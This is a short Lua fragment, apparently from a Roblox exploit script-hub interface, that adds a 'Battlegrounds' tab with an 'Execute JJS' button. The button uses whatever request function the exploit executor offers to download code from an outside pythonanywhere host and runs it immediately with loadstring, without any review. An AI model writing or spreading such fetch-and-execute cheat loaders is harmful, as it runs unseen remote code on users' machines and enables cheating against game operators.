-- ### BATTLEGROUNDS TAB ### --
BattlegroundsTab:CreateSection("Available Scripts")
BattlegroundsTab:CreateButton({
   Name = "Execute JJS",
   Callback = function()
      local req = (syn and syn.request) or (http and http.request) or http_request or request
      if req then
         loadstring(req({Url="https://peeky.pythonanywhere.com/jjs",Method="GET"}).Body)()
      end
   end,
})

